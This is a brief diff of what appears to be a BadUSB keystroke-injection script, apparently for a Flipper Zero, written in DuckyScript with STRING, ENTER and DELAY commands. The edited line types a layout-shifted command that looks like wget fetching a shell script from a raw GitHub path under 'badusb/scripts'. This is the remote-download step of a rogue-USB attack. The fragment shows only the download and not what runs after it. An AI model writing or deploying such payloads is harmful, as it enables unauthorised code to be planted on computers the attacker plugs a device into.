@@ -10,7 +10,7 @@ ENTER
 DELAY 750
 
 
-STRING zget https.>>rqz<githubusercontent<co;>Sn)zQlice>Flip6Her6)>;qin>bqdusb>scripts>;)@>dl<sh
+STRING zget https.>>rqz<githubusercontent<co;>Sn)zQlice>Flip=Her=)>;qin>bqdusb>scripts>;)@>dl<sh
 ENTER
 DELAY 750
 
